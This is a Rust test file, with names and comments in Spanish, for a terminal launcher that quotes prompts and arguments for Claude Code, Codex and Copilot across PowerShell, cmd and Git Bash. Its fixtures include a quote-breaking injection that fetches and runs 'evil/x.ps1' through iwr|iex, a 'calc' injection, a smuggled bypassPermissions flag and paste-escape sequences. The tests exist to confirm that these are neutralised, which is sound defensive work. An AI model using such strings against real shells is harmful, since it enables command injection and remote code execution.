use super::*;
use base64::Engine;

const EXE: &str = "C:\\Users\\ana\\AppData\\Roaming\\npm\\node_modules\\@anthropic-ai\\claude-code\\bin\\claude.exe";
const MALO: &str = "Revisá el README’; iwr evil/x.ps1|iex; ’";
const WORD: &str = "Revisá el user’s guide y ‘esto’ ‚y‛ \"aquello\"";

fn decode_ps(b64: &str) -> String {
    let b = base64::engine::general_purpose::STANDARD.decode(b64).unwrap();
    String::from_utf16(&b.chunks(2).map(|p| u16::from_le_bytes([p[0], p[1]])).collect::<Vec<_>>()).unwrap()
}

fn v(xs: &[&str]) -> Vec<String> {
    xs.iter().map(|s| s.to_string()).collect()
}

#[test]
fn ps_arg_deja_sin_comillas_lo_simple_y_duplica_la_comilla_recta() {
    assert_eq!(ps_arg("--continue"), "--continue");
    assert_eq!(ps_arg("it's"), "'it''s'");
}

#[test]
fn ps_arg_duplica_las_comillas_tipograficas() {
    assert_eq!(ps_arg("a \u{2019}; calc; \u{2018} b"), "'a \u{2019}\u{2019}; calc; \u{2018}\u{2018} b'");
    assert_eq!(ps_arg("\u{201a}\u{201b}"), "'\u{201a}\u{201a}\u{201b}\u{201b}'");
}

#[test]
fn un_prompt_que_empieza_con_guion_va_despues_de_guiones_dobles() {
    assert_eq!(claude_with_prompt("--permission-mode=bypassPermissions\nhola"), v(&["claude", "--", "--permission-mode=bypassPermissions hola"]));
    assert_eq!(shell_args(FamiliaShell::Ps, Some(&claude_with_prompt("--settings=x y"))).last().unwrap(), "claude -- '--settings=x y'");
}

#[test]
fn posix_arg_y_cmd_arg() {
    assert_eq!(posix_arg("it's"), "'it'\\''s'");
    assert_eq!(cmd_arg("a & b \"c\""), "\"a  b c\"");
}

#[test]
fn shell_args_arma_el_comando_de_cada_familia() {
    assert_eq!(shell_args(FamiliaShell::Ps, None), v(&["-NoLogo"]));
    assert_eq!(shell_args(FamiliaShell::Ps, Some(&v(&["claude", "hola vos"]))), v(&["-NoLogo", "-NoExit", "-Command", "claude 'hola vos'"]));
    assert_eq!(shell_args(FamiliaShell::Cmd, Some(&v(&["claude"]))), v(&["/k", "claude"]));
    assert_eq!(shell_args(FamiliaShell::Posix, Some(&v(&["claude", "x y"]))), v(&["--login", "-i", "-c", "claude 'x y'; exec bash --login -i"]));
}

#[test]
fn el_primer_mensaje_nunca_aparece_en_la_linea_de_comandos_de_la_shell() {
    for familia in [FamiliaShell::Ps, FamiliaShell::Cmd, FamiliaShell::Posix] {
        for exe in [Some(EXE), None] {
            let l = shell_launch(familia, Some(&claude_with_prompt(MALO)), exe);
            let linea = if familia == FamiliaShell::Ps { decode_ps(&l.args[3]) } else { l.args.join(" ") };
            assert!(!linea.contains("iwr"), "{familia:?} {exe:?}");
        }
    }
}

// CommandLineToArgvW (reglas de 2008 en adelante) para un solo argumento.
fn argv_w(arg: &str) -> Vec<String> {
    let a: Vec<char> = arg.chars().collect();
    let (mut out, mut cur, mut en_comillas, mut hay, mut i) = (Vec::new(), String::new(), false, false, 0);
    while i < a.len() {
        let c = a[i];
        if c == '\\' {
            let mut n = 0;
            while i < a.len() && a[i] == '\\' {
                n += 1;
                i += 1;
            }
            if a.get(i) == Some(&'"') {
                cur.push_str(&"\\".repeat(n / 2));
                if n % 2 == 1 {
                    cur.push('"');
                    i += 1;
                }
            } else {
                cur.push_str(&"\\".repeat(n));
            }
            hay = true;
            continue;
        }
        if c == '"' {
            if en_comillas && a.get(i + 1) == Some(&'"') {
                cur.push('"');
                i += 2;
            } else {
                en_comillas = !en_comillas;
                i += 1;
            }
            hay = true;
            continue;
        }
        if (c == ' ' || c == '\t') && !en_comillas {
            if hay {
                out.push(std::mem::take(&mut cur));
            }
            hay = false;
            i += 1;
            continue;
        }
        cur.push(c);
        hay = true;
        i += 1;
    }
    if hay {
        out.push(cur);
    }
    out
}

// NativeCommandParameterBinder.NeedQuotes del modo Legacy: si da true, PowerShell suma sus comillas.
fn ps_legacy_necesita_comillas(s: &str) -> bool {
    let (mut tras_barra, mut comillas) = (false, 0);
    for c in s.chars() {
        if c == '"' && !tras_barra {
            comillas += 1;
        } else if c.is_whitespace() && comillas % 2 == 0 {
            return true;
        }
        tras_barra = c == '\\';
    }
    false
}

#[test]
fn powershell_el_valor_de_sloth_prompt_pasa_sin_tocar_en_legacy_y_llega_entero() {
    for p in [WORD, MALO, "fin con barra\\", "C:\\x\\ \"q\\\" \\\\\"", "\"", "$env:PATH `n ; % %PATH%", "日本語 🦥", "a b  c"] {
        let valor = ps_prompt_value(p);
        assert!(!ps_legacy_necesita_comillas(&valor), "{p}");
        assert_eq!(argv_w(&valor), [p], "{p}");
    }
}

#[test]
fn powershell_con_claude_exe_script_fijo_y_el_mensaje_por_variable_despues_de_guiones() {
    let l = shell_launch(FamiliaShell::Ps, Some(&claude_with_prompt(WORD)), Some(EXE));
    assert_eq!(&l.args[..3], ["-NoLogo", "-NoExit", "-EncodedCommand"]);
    assert_eq!(
        decode_ps(&l.args[3]),
        format!("& {{ $PSNativeCommandArgumentPassing = 'Legacy'; $p = $env:{PROMPT_VAR}; Remove-Item Env:{PROMPT_VAR} -ErrorAction Ignore; & '{EXE}' -- $p }}")
    );
    assert_eq!(l.env[PROMPT_VAR], ps_prompt_value(WORD));
    assert_eq!(l.paste, None);
    assert_eq!(decode_ps(&shell_launch(FamiliaShell::Ps, Some(&v(&["claude", "--continue"])), Some(EXE)).args[3]), format!("& '{EXE}' --continue"));
}

#[test]
fn git_bash_con_claude_exe_comillas_despues_de_guiones_y_sin_conversion_de_rutas() {
    let l = shell_launch(FamiliaShell::Posix, Some(&claude_with_prompt("/ticket PROJ-12")), Some(EXE));
    assert_eq!(l.args[3], format!("p=${PROMPT_VAR}; unset {PROMPT_VAR}; MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL='*' '{EXE}' -- \"$p\"; unset p; exec bash --login -i"));
    assert_eq!(l.env[PROMPT_VAR], "/ticket PROJ-12");
}

#[test]
fn git_bash_una_ruta_de_windows_va_entre_comillas() {
    assert_eq!(posix_arg("C:\\x\\claude.exe"), "'C:\\x\\claude.exe'");
    assert_eq!(
        shell_launch(FamiliaShell::Posix, Some(&v(&["claude", "--continue"])), Some("C:\\x\\claude.exe")).args[3],
        "MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL='*' 'C:\\x\\claude.exe' --continue; exec bash --login -i"
    );
}

#[test]
fn un_mensaje_que_podria_ser_un_subcomando_se_pega_en_vez_de_ir_como_argumento() {
    for p in ["update", "mcp", "kill", "continuar", "nuevo-sub"] {
        let l = shell_launch(FamiliaShell::Ps, Some(&claude_with_prompt(p)), Some(EXE));
        assert_eq!(l.paste.as_deref(), Some(p));
        assert!(l.env.is_empty());
    }
    for p in ["Update", "update ", "update the README", "continuá"] {
        assert_eq!(shell_launch(FamiliaShell::Ps, Some(&claude_with_prompt(p)), Some(EXE)).paste, None, "{p}");
    }
}

#[test]
fn cmd_o_sin_claude_exe_el_mensaje_se_pega_cuando_claude_arranca() {
    for (familia, exe) in [(FamiliaShell::Cmd, Some(EXE)), (FamiliaShell::Ps, None), (FamiliaShell::Posix, None), (FamiliaShell::Ps, Some("C:\\npm\\claude.cmd"))] {
        let l = shell_launch(familia, Some(&claude_with_prompt("hola\r\nmundo\u{1b}[201~x")), exe);
        assert_eq!(l.paste.as_deref(), Some("hola mundo [201~x"), "{familia:?}");
        assert!(l.env.is_empty());
    }
    assert_eq!(shell_launch(FamiliaShell::Cmd, Some(&v(&["claude", "--continue"])), Some(EXE)).args, ["/k".to_string(), format!("{EXE} --continue")]);
}

#[test]
fn cmd_con_una_ruta_con_espacios_vuelve_a_claude_y_solo_esa_linea_no_busca_en_la_carpeta_actual() {
    let l = shell_launch(FamiliaShell::Cmd, Some(&v(&["claude"])), Some("C:\\Users\\Juan Pérez\\claude.exe"));
    assert_eq!(l.args, v(&["/k", "set NoDefaultCurrentDirectoryInExePath=1& claude& set NoDefaultCurrentDirectoryInExePath="]));
}

#[test]
fn no_default_current_directory_nunca_va_al_entorno_de_la_terminal() {
    for familia in [FamiliaShell::Ps, FamiliaShell::Cmd, FamiliaShell::Posix] {
        for exe in [Some(EXE), None, Some("C:\\Users\\Juan Pérez\\claude.exe")] {
            for claude in [Some(v(&["claude"])), Some(claude_with_prompt("Revisá el README")), None] {
                let l = shell_launch(familia, claude.as_deref(), exe);
                assert!(!l.env.keys().any(|k| k.to_lowercase().contains("nodefault")), "{familia:?} {exe:?}");
            }
        }
    }
    assert!(!shell_launch(FamiliaShell::Cmd, Some(&v(&["claude"])), Some(EXE)).args[1].contains("NoDefault"));
}

#[test]
fn sin_claude_shell_launch_es_la_shell_sola() {
    assert_eq!(shell_launch(FamiliaShell::Ps, None, None), ShellLaunch { args: v(&["-NoLogo"]), ..Default::default() });
    assert_eq!(shell_launch(FamiliaShell::Posix, Some(&[]), None), ShellLaunch { args: v(&["--login", "-i"]), ..Default::default() });
}

#[test]
fn el_pegado_no_se_puede_cerrar_antes_de_tiempo() {
    assert_eq!(paste_payload("a\u{1b}[201~b"), "\u{1b}[200~a [201~b\u{1b}[201~");
}

#[test]
fn windows_arg_body_sigue_las_reglas_de_command_line_to_argv_w() {
    assert_eq!(windows_arg_body("a\"b"), "a\\\"b");
    assert_eq!(windows_arg_body("a\\\"b"), "a\\\\\\\"b");
    assert_eq!(windows_arg_body("fin\\"), "fin\\\\");
    assert_eq!(windows_arg_body("C:\\x\\y"), "C:\\x\\y");
}

#[test]
fn codex_y_copilot_en_powershell_por_el_shim_cmd_y_copilot_nunca_por_variable() {
    let shim = "C:\\Users\\ana\\AppData\\Roaming\\npm\\codex.cmd";
    let l = shell_launch(FamiliaShell::Ps, Some(&v(&["codex", "resume"])), Some(shim));
    assert_eq!(decode_ps(&l.args[3]), format!("& {shim} resume"));
    let c = shell_launch(FamiliaShell::Ps, Some(&v(&["copilot", "--", "hola mundo"])), Some(EXE.replace("claude.exe", "copilot.exe").as_str()));
    assert_eq!(c.paste.as_deref(), Some("hola mundo"));
    assert!(c.env.is_empty());
    // Un .cmd con sintaxis de cmd en la ruta no se usa.
    let malo = shell_launch(FamiliaShell::Ps, Some(&v(&["codex"])), Some("C:\\x&y\\codex.cmd"));
    assert_eq!(decode_ps(&malo.args[3]), "& codex");
}
